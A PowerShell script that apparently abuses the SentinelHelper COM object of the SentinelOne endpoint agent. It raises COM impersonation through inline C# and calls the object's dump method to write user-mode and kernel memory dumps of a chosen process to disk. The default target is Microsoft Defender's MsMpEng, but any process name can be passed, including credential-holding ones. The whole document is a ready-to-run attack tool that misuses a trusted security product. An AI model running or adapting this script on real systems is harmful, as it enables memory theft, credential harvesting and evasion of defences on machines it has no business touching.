[CmdletBinding()]
param(
    [Parameter(Mandatory = $false)]
    [string]$ProcessName = "MsMpEng",
    
    [Parameter(Mandatory = $false)]
    [string]$UserDumpPath = "c:\user.dmp",
    
    [Parameter(Mandatory = $false)]
    [string]$KernelDumpPath = "c:\kernel.dmp",
    
    [Parameter(Mandatory = $false)]
    [string]$LogPath = "$env:TEMP\SentinelDump_Log.txt"
)

function log {
    param(
        [string] $Msg,
        [switch] $Hide
    )

    Add-Content -Path $script:LogPath -Value "[$(Get-Date)] $Msg"

    if (-not $Hide) {
        Write-Output "[$(Get-Date)] $Msg"
    }
}

function logException {
    param(
        [string] $Msg,
        [string] $Ex
    )

    log "$Msg" -Hide
    log "$Ex" -Hide
}

function Get-HelperComObject {
    $code = @"
         using System;
         using System.Runtime.InteropServices;

         public class ImpTest
         {
             [DllImport("Ole32.dll", CharSet = CharSet.Auto)]
             public static extern int CoSetProxyBlanket(
                IntPtr pProxy,
                uint dwAuthnSvc,
                uint dwAuthzSvc,
                uint pServerPrincName,
                uint dwAuthLevel,
                uint dwImpLevel,
                IntPtr pAuthInfo,
                uint dwCapabilities
             );

             public static int SetSecurity(object objDCOM)
             {
                 IntPtr dispatchInterface = Marshal.GetIDispatchForObject(objDCOM);
                 int hr = CoSetProxyBlanket(
                    dispatchInterface,
                    0xffffffff,
                    0xffffffff,
                    0xffffffff,
                    0, // Authentication Level
                    3, // Impersonation Level
                    IntPtr.Zero,
                    64
                 );
                 return hr;
             }
         }
"@
    try {
        Add-Type -TypeDefinition $code | Out-Null

        log "Initializing SentinelHelper COM object..." | Out-Null
        $SentinelHelper = New-Object -com "SentinelHelper.1"

        log "SentinelHelper COM object initialized successfully" | Out-Null
        [ImpTest]::SetSecurity($SentinelHelper)  | Out-Null
        $SentinelHelper

    } catch {
        logException -Msg "Error getting helper com object" -Ex $_ | Out-Null
    }
}

try {
    log "Starting dump process for $ProcessName..."
    
    $sentinelAgentProcessId = (Get-Process -Name $ProcessName -ErrorAction Stop).Id
    log "Found process $ProcessName with PID: $sentinelAgentProcessId"
    
    $SentinelHelper = Get-HelperComObject
    
    if ($SentinelHelper) {
        log "Calling dump method..."
        $SentinelHelper.dump($sentinelAgentProcessId, $UserDumpPath, $KernelDumpPath)
        log "Dump completed successfully"
        log "User dump: $UserDumpPath"
        log "Kernel dump: $KernelDumpPath"
    } else {
        log "Failed to initialize SentinelHelper COM object"
    }
    
} catch {
    logException -Msg "Error during dump process" -Ex $_
    Write-Error "Dump failed: $_"
}